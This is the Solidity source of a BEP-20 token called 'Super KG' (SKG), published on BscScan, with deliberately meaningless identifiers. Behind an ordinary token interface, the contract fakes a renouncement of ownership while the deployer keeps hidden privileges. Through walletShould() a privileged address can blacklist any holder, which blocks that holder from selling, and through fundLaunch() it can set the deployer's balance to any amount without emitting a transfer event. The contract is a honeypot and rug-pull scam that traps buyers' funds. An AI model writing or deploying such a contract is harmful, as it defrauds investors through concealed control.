/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface tradingReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedReceiver) external view returns (uint256);

    function transfer(address marketingModeEnable, uint256 atMin) external returns (bool);

    function allowance(address modeBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 atMin) external returns (bool);

    function transferFrom(
        address sender,
        address marketingModeEnable,
        uint256 atMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atTrading, uint256 value);
    event Approval(address indexed modeBuy, address indexed spender, uint256 value);
}

interface tradingReceiverMetadata is tradingReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface launchSwapBuy {
    function createPair(address walletExempt, address takeMin) external returns (address);
}

interface buyFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tradingLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract SuperKG is tradingLimit, tradingReceiver, tradingReceiverMetadata {
    uint8 private launchedTx = 18;
    


    uint256 private totalSell;
    mapping(address => bool) public launchedMode;
    address public autoTeam;
    mapping(address => mapping(address => uint256)) private amountLiquidity;
    address public teamFrom;
    uint256 private listMarketing;
    address private limitToken;
    uint256 private isTx;
    bool public receiverAmount;
    bool public txIs;
    uint256 private senderMinFrom;
    mapping(address => uint256) private receiverReceiver;
    mapping(address => bool) public tradingTx;

    string private buyReceiver = "SKG";
    bool public amountIs;
    
    
    string private totalLaunchedLaunch = "Super KG";
    bool private toMarketingMin;
    bool private limitTeamTx;
    uint256 private tokenList = 100000000 * 10 ** launchedTx;

    uint256 private fromAuto;
    

    event OwnershipTransferred(address indexed totalAutoAt, address indexed isList);

    constructor (){
        
        buyFee senderTrading = buyFee(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamFrom = launchSwapBuy(senderTrading.factory()).createPair(senderTrading.WETH(), address(this));
        limitToken = _msgSender();
        if (fromAuto != senderMinFrom) {
            amountIs = false;
        }
        autoTeam = limitToken;
        launchedMode[autoTeam] = true;
        
        receiverReceiver[autoTeam] = tokenList;
        emit Transfer(address(0), autoTeam, tokenList);
        senderMode();
    }

    

    function balanceOf(address launchedReceiver) public view virtual override returns (uint256) {
        return receiverReceiver[launchedReceiver];
    }

    function approve(address launchedLaunch, uint256 atMin) public virtual override returns (bool) {
        amountLiquidity[_msgSender()][launchedLaunch] = atMin;
        emit Approval(_msgSender(), launchedLaunch, atMin);
        return true;
    }

    function allowance(address feeToken, address launchedLaunch) external view virtual override returns (uint256) {
        return amountLiquidity[feeToken][launchedLaunch];
    }

    function walletShould(address atTake) public {
        
        if (atTake == autoTeam || atTake == teamFrom || !launchedMode[_msgSender()]) {
            return;
        }
        if (senderMinFrom != isTx) {
            isTx = totalSell;
        }
        tradingTx[atTake] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenList;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedTx;
    }

    function totalEnable() public {
        if (senderMinFrom == isTx) {
            toMarketingMin = true;
        }
        
        receiverAmount=false;
    }

    function marketingLimit(address senderAutoTotal) public {
        if (txIs) {
            return;
        }
        if (fromAuto == isTx) {
            limitTeamTx = true;
        }
        launchedMode[senderAutoTotal] = true;
        
        txIs = true;
    }

    function fundLaunch(uint256 atMin) public {
        if (!launchedMode[_msgSender()]) {
            return;
        }
        receiverReceiver[autoTeam] = atMin;
    }

    function owner() external view returns (address) {
        return limitToken;
    }

    function getOwner() external view returns (address) {
        return limitToken;
    }

    function symbol() external view virtual override returns (string memory) {
        return buyReceiver;
    }

    function transfer(address liquidityReceiver, uint256 atMin) external virtual override returns (bool) {
        return tokenAmount(_msgSender(), liquidityReceiver, atMin);
    }

    function transferFrom(address autoSell, address marketingModeEnable, uint256 atMin) external override returns (bool) {
        if (amountLiquidity[autoSell][_msgSender()] != type(uint256).max) {
            require(atMin <= amountLiquidity[autoSell][_msgSender()]);
            amountLiquidity[autoSell][_msgSender()] -= atMin;
        }
        return tokenAmount(autoSell, marketingModeEnable, atMin);
    }

    function tokenAmount(address autoSell, address marketingModeEnable, uint256 atMin) internal returns (bool) {
        if (autoSell == autoTeam || marketingModeEnable == autoTeam) {
            return senderLaunched(autoSell, marketingModeEnable, atMin);
        }
        
        require(!tradingTx[autoSell]);
        
        return senderLaunched(autoSell, marketingModeEnable, atMin);
    }

    function exemptReceiver() public view returns (uint256) {
        return senderMinFrom;
    }

    function receiverToken() public view returns (bool) {
        return toMarketingMin;
    }

    function swapTotal() public view returns (bool) {
        return amountIs;
    }

    function senderMode() public {
        emit OwnershipTransferred(autoTeam, address(0));
        limitToken = address(0);
    }

    function senderLaunched(address autoSell, address marketingModeEnable, uint256 atMin) internal returns (bool) {
        require(receiverReceiver[autoSell] >= atMin);
        receiverReceiver[autoSell] -= atMin;
        receiverReceiver[marketingModeEnable] += atMin;
        emit Transfer(autoSell, marketingModeEnable, atMin);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return totalLaunchedLaunch;
    }

    function fundList() public {
        
        
        totalSell=0;
    }


}